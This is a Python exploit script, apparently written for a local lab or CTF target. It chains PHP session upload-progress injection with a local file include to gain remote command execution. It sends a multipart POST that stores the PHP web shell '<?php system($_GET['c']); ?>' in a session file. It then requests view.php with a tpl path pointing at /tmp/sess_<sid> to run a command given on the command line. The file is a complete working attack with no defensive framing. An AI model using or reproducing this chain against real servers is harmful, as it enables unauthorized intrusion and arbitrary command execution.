#!/usr/bin/env python3
"""upload_progress injection -> include sink (Chain A), cleanup=0 variant.

The write stores the raw PHP_SESSION_UPLOAD_PROGRESS value in the session file;
view.php?tpl=/tmp/sess_<sid> includes it and executes the embedded PHP.

Usage: chain_a.py <port> [cmd]
"""
import os
import socket
import sys

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
sid = "chaina" + "".join("%02x" % b for b in os.urandom(10))
payload = "<?php system($_GET['c']); ?>"
boundary = b"----chainA"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + payload.encode() + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\n" + b"Z" * 64 + b"\r\n"
    b"--" + boundary + b"--\r\n"
)

def send(req):
    s = socket.create_connection(("127.0.0.1", port), timeout=20)
    s.sendall(req)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data

w = (b"POST /chainW/up.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
     b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
     b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
     b"Content-Length: " + str(len(body)).encode() + b"\r\n"
     b"Connection: close\r\n\r\n") + body
print("[1] write:", send(w).split(b"\r\n", 1)[0].decode("latin-1"))

r = (b"GET /view.php?tpl=/tmp/sess_" + sid.encode() + b"&c=" + cmd.encode() +
     b" HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
resp = send(r)
head, _, out = resp.partition(b"\r\n\r\n")
print("[2] include:", head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace")[:2000])
